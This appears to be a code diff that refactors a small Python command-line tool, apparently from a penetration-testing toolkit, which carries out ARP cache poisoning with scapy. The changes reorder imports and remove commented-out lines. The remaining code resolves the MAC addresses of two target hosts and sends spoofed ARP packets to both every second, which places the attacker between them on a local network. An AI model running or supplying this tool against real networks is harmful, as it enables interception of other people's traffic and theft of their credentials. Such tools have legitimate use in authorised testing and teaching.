@@ -1,8 +1,9 @@
-import click
-#from habu.lib.arpoison import arpoison
-from scapy.all import arpcachepoison, conf, getmacbyip, Ether, ARP, sendp
-#import ipaddress
 import time
+
+import click
+
+from scapy.all import ARP, Ether, conf, getmacbyip, sendp
+
 
 @click.command()
 @click.argument('t1')
@@ -12,8 +13,6 @@ def cmd_arpoison(t1, t2, verbose):
     """ARP cache poison"""
 
     conf.verb = verbose
-
-    #arpcachepoison(target1, target2, 1)
 
     mac1 = getmacbyip(t1)
     mac2 = getmacbyip(t2)
@@ -30,12 +29,9 @@ def cmd_arpoison(t1, t2, verbose):
             sendp(pkt2)
             pkt1.show2()
             pkt2.show2()
-            #if conf.verb > 1:
-            #    os.write(1,b".")
             time.sleep(1)
     except KeyboardInterrupt:
         pass
 
 if __name__ == '__main__':
     cmd_arpoison()
-
